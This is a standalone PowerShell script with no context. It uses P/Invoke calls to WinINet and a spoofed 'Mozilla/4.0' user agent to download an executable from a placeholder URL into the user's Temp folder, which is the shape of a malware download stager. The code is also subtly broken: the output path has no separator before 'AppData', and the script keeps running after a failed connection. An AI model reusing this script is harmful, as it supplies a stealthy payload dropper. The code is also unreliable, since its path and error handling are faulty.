$url = "https://example.com/test.exe"  
$username = $env:username
$outputFilePath = 'C:/Users/' + $username + 'AppData/Local/Temp/test.exe'

Add-Type @"  
using System;  
using System.Runtime.InteropServices;  

public class Wininet {  
    [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]  
    public static extern IntPtr InternetOpen(string lpszAgent, int dwAccessType, string lpszProxyName, string lpszProxyBypass, int dwFlags);  

    [DllImport("wininet.dll", SetLastError = true, CharSet = CharSet.Auto)]  
    public static extern IntPtr InternetOpenUrl(IntPtr hInternet, string lpszUrl, string lpszHeaders, int dwHeadersLength, int dwFlags, IntPtr dwContext);  

    [DllImport("wininet.dll", SetLastError = true)]  
    [return: MarshalAs(UnmanagedType.Bool)]  
    public static extern bool InternetReadFile(IntPtr hFile, byte[] lpBuffer, uint dwNumberOfBytesToRead, out uint lpdwNumberOfBytesWritten);  

    [DllImport("wininet.dll", SetLastError = true)]  
    [return: MarshalAs(UnmanagedType.Bool)]  
    public static extern bool InternetCloseHandle(IntPtr hInternet);  
}  
"@  

 

  
$hInternet = [Wininet]::InternetOpen("Mozilla/4.0", 0, $null, $null, 0)  

  
$hFile = [Wininet]::InternetOpenUrl($hInternet, $url, $null, 0, 0, [IntPtr]::Zero)  
if ($hFile -eq [IntPtr]::Zero) {  
    [Wininet]::InternetCloseHandle($hInternet)  
}  

 
$data = New-Object byte[] 4096  
$bytesRead = 0  
$outputFile = [System.IO.File]::Create($outputFilePath)  

try {  
   
    do {  
        $success = [Wininet]::InternetReadFile($hFile, $data, [uint32]$data.Length, [ref]$bytesRead)  
        if ($success -and $bytesRead -gt 0) {  
            $outputFile.Write($data, 0, $bytesRead)  
        }  
    } while ($success -and $bytesRead -gt 0)  
}  
finally {  
     
    $outputFile.Close()  
    [Wininet]::InternetCloseHandle($hFile)  
    [Wininet]::InternetCloseHandle($hInternet)  
}
